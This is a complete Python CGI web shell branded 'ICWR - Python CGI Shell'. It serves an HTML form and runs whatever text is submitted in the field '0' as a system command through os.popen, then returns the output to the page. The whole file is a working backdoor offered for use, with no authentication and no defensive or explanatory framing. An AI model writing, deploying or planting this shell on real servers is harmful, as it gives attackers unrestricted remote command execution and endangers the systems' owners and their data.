#!/usr/bin/python
# Python CGI Shell
# Copyright (c)2019 - Afrizal F.A - ICWR
try:
    import cgitb; cgitb.enable()
except:
    pass
    
import os, cgi

param=cgi.FieldStorage()
cmd=param.getvalue("0")

print("Content-type:text/html\r\n\r\n")
print("<html>")
print("<title>ICWR - Python CGI Shell</title>")
print("<h1>ICWR - Python CGI Shell</h1>")
print("""<form enctype=\"multipart/form-data\" method=\"post\">
{WebShell} -> <input type=\"text\" name=\"0\">
<input type=\"submit\" value=\"Exec\">
</form>""")
if cmd :
    print("<pre>")
    print(os.popen(cmd).read().replace("<","").replace(">",""))
    print("</pre>")
